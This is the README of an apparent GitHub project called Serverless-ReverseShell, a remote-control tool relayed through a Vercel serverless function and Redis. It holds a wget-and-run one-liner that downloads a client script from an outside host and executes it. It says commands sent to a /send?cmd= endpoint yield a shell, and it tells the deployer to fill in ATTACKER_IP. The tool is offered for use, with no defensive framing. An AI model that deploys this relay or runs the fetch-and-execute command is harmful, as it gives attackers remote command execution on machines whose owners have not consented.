
# Serverless-ReverseShell


## Demo

https://chat.fjh1997.top/

## Usage

Make client connect
```
wget https://chat.fjh1997.top/download -O client.py && python3 client.py
```
Then use https://chat.fjh1997.top/send?cmd=xxx to get shell!

## Running Locally

```bash
npm i -g vercel
vercel dev
```

Your application is now available at `http://localhost:3000`.

## One-Click Deploy

Deploy the example using [Vercel](https://vercel.com?utm_source=github&utm_medium=readme&utm_campaign=vercel-examples):

[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/fjh1997/Serverless-ReverseShell/tree/main/&&env=REDIS_URL)

Remember to set the environment variable REDIS_URL to the address from [redislabs](https://app.redislabs.com/)<br>
And also the ATTACKER_IP in  client.py :-) <br>
note: For chinese user,a cdn is needed as Vercel was blocked.
